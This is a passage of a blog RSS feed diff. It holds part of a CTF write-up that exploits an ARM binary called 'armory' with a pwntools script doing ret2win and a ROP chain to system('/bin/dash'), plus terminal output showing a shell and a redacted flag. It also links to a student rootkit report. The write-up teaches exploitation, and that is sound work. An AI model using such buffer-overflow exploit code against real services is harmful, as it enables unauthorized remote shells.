+&lt;p&gt;One thing to notice is that &lt;code&gt;scanf&lt;/code&gt; doesn&amp;rsquo;t abort on &lt;code&gt;\x00&lt;/code&gt; and allows us to write zeroes in the middle of our ROPchain. We can see in scanf documentation that &amp;ldquo;The input string stops at white space or at the maximum field width, whichever occurs first.&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We can modify our exploit script to handle the simple and rop-based exploits:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; argparse
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil_ea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0001052c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    parser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; argparse&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ArgumentParser()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    subcommands &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_subparsers(dest&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;subcommand&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    simple_parser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subcommands&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_parser(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;simple&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    rop_parser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subcommands&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_parser(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rop&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    rop_parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-b&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--binary&amp;#34;&lt;/span&gt;, help&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The binary to exploit and retrieve gadgets from&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;, help&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The host to connect to&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;, help&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The port to connect to&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse_args()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subcommand &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;simple&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Exploiting with RET-2-WIN&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(evil_ea)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;subcommand &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rop&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Exploiting with ROP&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        bin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        binsh_ea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; next(bin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/dash&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        g_evil_system_stub &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0001053C&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 0x0001053c : mov r0, r3 ; bl #0x103cc ; mov r0, r0 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        g_mov_r0_r3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00010380&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 0x0001037c : pop {r3, lr} ; bx lr &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(g_mov_r0_r3)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(binsh_ea)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(g_evil_system_stub)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        parser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;print_help()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;host, args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;port)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(payload)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we can exploit the remote service using ROP !&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 exploit.py rop  -b ./armory localhost &lt;span style=&#34;color:#ae81ff&#34;&gt;4000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exploiting with ROP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/path/to/armory&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Arch:       arm-32-little
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RELRO:      Full RELRO
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Stack:      No canary found
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    NX:         NX enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PIE:        No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x10000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Stripped:   No
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Opening connection to localhost on port 4000: Done
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Switching to interactive mode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello, what&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s your name?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;80&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;03&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;01!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat flag
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ECSC&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;__REDACTED__&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;One remaining issue is that we cannot call &lt;code&gt;exit&lt;/code&gt; or &lt;code&gt;abort&lt;/code&gt; at the end of our exploit because the last gadget is making the program crash by branching to an invalid address.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>MalDev: Linux Rootkit</title>
+      <link>//localhost:1313/posts/linux-rootkit/</link>
+      <pubDate>Tue, 29 Oct 2024 12:41:54 +0100</pubDate>
+      
+      <guid>//localhost:1313/posts/linux-rootkit/</guid>
+      <description>&lt;h1 id=&#34;how-to-build-a-linux-rootkit&#34;&gt;How to build a Linux Rootkit&lt;/h1&gt;
+&lt;p&gt;Here is a &lt;a href=&#34;//localhost:1313/report-linrootkit.pdf&#34;&gt;report&lt;/a&gt; on building a simple Linux Rootkit during my OS Security course (report is in French language).&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;how-to-build-a-linux-rootkit&#34;&gt;How to build a Linux Rootkit&lt;/h1&gt;
+&lt;p&gt;Here is a &lt;a href=&#34;//localhost:1313/report-linrootkit.pdf&#34;&gt;report&lt;/a&gt; on building a simple Linux Rootkit during my OS Security course (report is in French language).&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
